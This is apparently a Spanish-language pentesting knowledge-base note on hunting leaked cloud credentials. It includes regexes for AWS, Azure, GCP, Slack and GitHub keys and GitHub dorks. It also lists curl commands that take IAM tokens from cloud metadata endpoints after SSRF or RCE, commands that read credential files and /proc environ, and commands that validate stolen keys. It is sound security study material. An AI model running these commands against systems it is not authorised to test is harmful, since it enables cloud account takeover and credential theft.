---
aliases:
tags:
  - estado/completo
  - asset/cloud
  - technique/credential-access
kind: Technique
linked:
  - "[[GitHub Dorking]]"
  - "[[Cloud Metadata Services]]"
---
# Cloud Credential Hunting

> [!info]
> Búsqueda de API keys cloud (AWS, Azure, GCP) en código, repos, metadata, env vars, configs. High-impact: una key leaked = compromiso completo de la cloud account.

***

## Patrones de keys

| Provider | Pattern | Notas |
|---|---|---|
| **AWS Access Key** | `AKIA[0-9A-Z]{16}` | Public key ID |
| **AWS Secret Key** | `[a-zA-Z0-9/+=]{40}` | Acompaña access key |
| **AWS Session Token** | larguísima | Temporary STS |
| **Azure Storage Key** | `[A-Za-z0-9+/]{86}==` | Storage account key |
| **Azure SAS Token** | `?sv=...&sig=...` | URL query string |
| **GCP Service Account** | JSON con `private_key`, `client_email`, `project_id` | File-based |
| **GCP API Key** | `AIza[0-9A-Za-z\-_]{35}` | Embed en frontend |
| **Slack Token** | `xox[abp]-[0-9A-Za-z-]+` | Bonus |
| **GitHub Token** | `ghp_[A-Za-z0-9]{36}` | Classic; `ghs_`, `gho_` también |

***

## Fuentes

### Code repos públicos

```bash
# GitHub Dorking
"AKIA" in:file extension:env
"aws_secret_access_key" extension:py
"private_key" filename:credentials.json

# Tools
trufflehog github --org=<target-org>
gitleaks detect --source=./repo
git-secrets --scan
```

### Cloud metadata (post SSRF / RCE)

```bash
# AWS EC2 metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# AWS IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

# GCP
curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Ver [[Cloud Metadata Services]], [[SSRF - Cloud Metadata]].

### Local filesystem

```bash
# AWS
find / -name '.aws' -type d 2>/dev/null
cat ~/.aws/credentials
cat ~/.aws/config

# Azure
cat ~/.azure/azureProfile.json
cat ~/.azure/accessTokens.json   # legacy

# GCP
find / -name '*.json' -exec grep -l 'service_account' {} \; 2>/dev/null
gcloud auth list
ls ~/.config/gcloud/

# Env vars (LFI, RCE, /proc/self/environ)
env | grep -iE 'aws|azure|gcp|token|key'
cat /proc/<pid>/environ | tr '\0' '\n'
```

### CI/CD configs

- `.gitlab-ci.yml`, `.github/workflows/*.yml` — secrets passed
- `Jenkinsfile`, `azure-pipelines.yml`
- `terraform.tfstate`, `*.tfvars`
- `.env`, `docker-compose.yml`

### Decompiled binaries / mobile apps

- Android APK `strings.xml`, java source
- iOS plist
- Electron app `app.asar`

***

## Validation

```bash
# AWS — check si key válida + permisos
aws sts get-caller-identity
enumerate-iam --access-key <AKIA> --secret-key <secret>

# Azure
az login --service-principal -u <id> -p <secret> --tenant <tenant>

# GCP
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
```

***

## Tools

- **trufflehog** — multi-source secret scanner
- **gitleaks** — git secrets
- **noseyparker** — fast secret scanner
- **detect-secrets** (Yelp)
- **SecretFinder** — JS secrets in browser
- **mantra** — JS file mining

***

## Notas Relacionadas

- [[Cloud Metadata Services]]
- [[GitHub Dorking]]
- [[Source Code Review]]
- [[SSRF - Cloud Metadata]]
